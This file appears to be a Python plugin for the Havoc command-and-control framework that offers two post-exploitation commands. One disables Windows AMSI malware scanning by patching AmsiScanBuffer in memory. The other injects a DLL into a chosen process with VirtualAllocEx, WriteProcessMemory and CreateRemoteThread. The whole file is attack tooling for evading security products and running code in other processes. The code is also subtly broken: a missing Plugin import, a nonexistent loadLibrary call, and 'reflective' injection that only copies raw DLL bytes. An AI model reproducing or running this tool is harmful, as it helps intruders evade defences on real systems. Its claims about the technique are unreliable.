from havoc import Demon, RegisterCommand
import ctypes
import os
import platform
from ctypes import wintypes

# Constants for Windows API
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
PAGE_EXECUTE_READWRITE = 0x40

# Load kernel32.dll
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

# Define types and structures
SIZE_T = ctypes.c_size_t
LPSTR = ctypes.c_char_p
LPVOID = ctypes.c_void_p

# Define Windows API functions
OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
OpenProcess.restype = wintypes.HANDLE

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = [wintypes.HANDLE, LPVOID, SIZE_T, wintypes.DWORD, wintypes.DWORD]
VirtualAllocEx.restype = LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = [wintypes.HANDLE, LPVOID, LPVOID, SIZE_T, ctypes.POINTER(SIZE_T)]
WriteProcessMemory.restype = wintypes.BOOL

CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = [wintypes.HANDLE, ctypes.POINTER(ctypes.c_void_p), SIZE_T, LPVOID, LPVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
CreateRemoteThread.restype = wintypes.HANDLE

def bypass_amsi():
    """
    Disables AMSI by patching the AmsiScanBuffer function.
    """
    try:
        if platform.system() != 'Windows':
            return "[-] AMSI bypass is only supported on Windows."

        amsi = ctypes.windll.loadLibrary('amsi.dll')
        amsi.AmsiScanBuffer.restype = ctypes.c_ulong
        amsi.AmsiScanBuffer.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p, ctypes.c_void_p]
        patch = b"\x31\xC0\xC3"  # XOR EAX, EAX; RET
        ctypes.windll.kernel32.VirtualProtect(amsi.AmsiScanBuffer, len(patch), 0x40, ctypes.byref(ctypes.c_long(0)))
        ctypes.memmove(amsi.AmsiScanBuffer, patch, len(patch))
        return "[+] AMSI bypassed successfully!"
    except Exception as e:
        return f"[-] Error bypassing AMSI: {e}"

def reflective_dll_injection(pid, dll_path):
    """
    Injects a DLL into a remote process using reflective DLL injection.
    """
    try:
        if platform.system() != 'Windows':
            return "[-] Reflective DLL injection is only supported on Windows."

        # Open the target process
        process_handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not process_handle:
            return f"[-] Error opening process: {ctypes.get_last_error()}"

        # Allocate memory in the remote process
        dll_size = os.path.getsize(dll_path)
        remote_memory = VirtualAllocEx(process_handle, None, dll_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
        if not remote_memory:
            return f"[-] Error allocating memory: {ctypes.get_last_error()}"

        # Write the DLL into the remote process's memory
        with open(dll_path, 'rb') as f:
            dll_data = f.read()
        written = ctypes.c_size_t(0)
        if not WriteProcessMemory(process_handle, remote_memory, dll_data, dll_size, ctypes.byref(written)):
            return f"[-] Error writing to memory: {ctypes.get_last_error()}"

        # Create a remote thread to execute the DLL
        thread_id = ctypes.c_ulong(0)
        thread_handle = CreateRemoteThread(process_handle, None, 0, remote_memory, None, 0, ctypes.byref(thread_id))
        if not thread_handle:
            return f"[-] Error creating remote thread: {ctypes.get_last_error()}"

        return f"[+] DLL injected successfully into process {pid}!"
    except Exception as e:
        return f"[-] Error during injection: {e}"

# Havoc C2 Integration
def bypass_amsi_command(demon, *args):
    """
    Command to bypass AMSI.
    """
    result = bypass_amsi()
    demon.ConsoleWrite(result)

def inject_dll_command(demon, *args):
    """
    Command to inject a DLL into a remote process.
    """
    if len(args) != 2:
        demon.ConsoleWrite("[-] Usage: inject_dll [pid] [dll_path]")
        return

    pid = int(args[0])
    dll_path = args[1]
    result = reflective_dll_injection(pid, dll_path)
    demon.ConsoleWrite(result)

# Register commands with Havoc C2
def initialize():
    RegisterCommand("bypass_amsi", "Bypass AMSI", bypass_amsi_command)
    RegisterCommand("inject_dll", "Inject a DLL into a remote process", inject_dll_command)

# Initialize the plugin
plugin = Plugin("BypassEDRAV", "Advanced EDR/AV bypass techniques", initialize)